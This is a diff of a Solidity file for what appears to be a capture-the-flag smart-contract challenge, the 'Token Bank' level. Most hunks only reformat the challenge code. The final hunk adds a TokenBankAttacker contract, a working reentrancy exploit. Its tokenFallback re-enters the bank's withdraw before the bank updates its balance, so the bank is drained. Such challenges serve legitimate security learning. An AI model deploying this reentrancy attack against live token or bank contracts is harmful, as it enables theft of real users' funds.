@@ -1,11 +1,7 @@
 pragma solidity ^0.4.21;
 
 interface ITokenReceiver {
-    function tokenFallback(
-        address from,
-        uint256 value,
-        bytes data
-    ) external;
+    function tokenFallback(address from, uint256 value, bytes data) external;
 }
 
 contract SimpleERC223Token {
@@ -16,7 +12,7 @@ contract SimpleERC223Token {
     string public symbol = "SET";
     uint8 public decimals = 18;
 
-    uint256 public totalSupply = 1000000 * (uint256(10)**decimals);
+    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);
 
     event Transfer(address indexed from, address indexed to, uint256 value);
 
@@ -64,10 +60,10 @@ contract SimpleERC223Token {
 
     mapping(address => mapping(address => uint256)) public allowance;
 
-    function approve(address spender, uint256 value)
-        public
-        returns (bool success)
-    {
+    function approve(
+        address spender,
+        uint256 value
+    ) public returns (bool success) {
         allowance[msg.sender][spender] = value;
         emit Approval(msg.sender, spender, value);
         return true;
@@ -98,19 +94,15 @@ contract TokenBankChallenge {
 
         // Divide up the 1,000,000 tokens, which are all initially assigned to
         // the token contract's creator (this contract).
-        balanceOf[msg.sender] = 500000 * 10**18; // half for me
-        balanceOf[player] = 500000 * 10**18; // half for you
+        balanceOf[msg.sender] = 500000 * 10 ** 18; // half for me
+        balanceOf[player] = 500000 * 10 ** 18; // half for you
     }
 
     function isComplete() public view returns (bool) {
         return token.balanceOf(this) == 0;
     }
 
-    function tokenFallback(
-        address from,
-        uint256 value,
-        bytes
-    ) public {
+    function tokenFallback(address from, uint256 value, bytes) public {
         require(msg.sender == address(token));
         require(balanceOf[from] + value >= balanceOf[from]);
 
@@ -122,5 +114,47 @@ contract TokenBankChallenge {
 
         require(token.transfer(msg.sender, amount));
         balanceOf[msg.sender] -= amount;
+    }
+}
+
+contract TokenBankAttacker {
+    TokenBankChallenge private bankContract;
+    SimpleERC223Token private tokenContract;
+
+    function TokenBankAttacker(
+        address _bankContract,
+        address _tokenContract
+    ) public {
+        bankContract = TokenBankChallenge(_bankContract);
+        tokenContract = SimpleERC223Token(_tokenContract);
+    }
+
+    function tokenFallback(address from, uint256 value, bytes) public {
+        if (from != address(bankContract)) return;
+        withdraw();
+    }
+
+    function deposit() public {
+        bankContract.token().transfer(address(bankContract), 500000 * 10 ** 18);
+    }
+
+    function withdraw() public {
+        // this one is the bugged one, does not update after withdraw
+        uint256 myInitialBalance = bankContract.balanceOf(address(this));
+        // this one from the token contract, updates after withdraw
+        uint256 challengeTotalRemainingBalance = bankContract.token().balanceOf(
+            address(bankContract)
+        );
+        // are there more tokens to empty?
+        bool keepRecursing = challengeTotalRemainingBalance > 0;
+
+        if (keepRecursing) {
+            // can only withdraw at most our initial balance per withdraw call
+            uint256 toWithdraw = myInitialBalance <
+                challengeTotalRemainingBalance
+                ? myInitialBalance
+                : challengeTotalRemainingBalance;
+            bankContract.withdraw(toWithdraw);
+        }
     }
 }
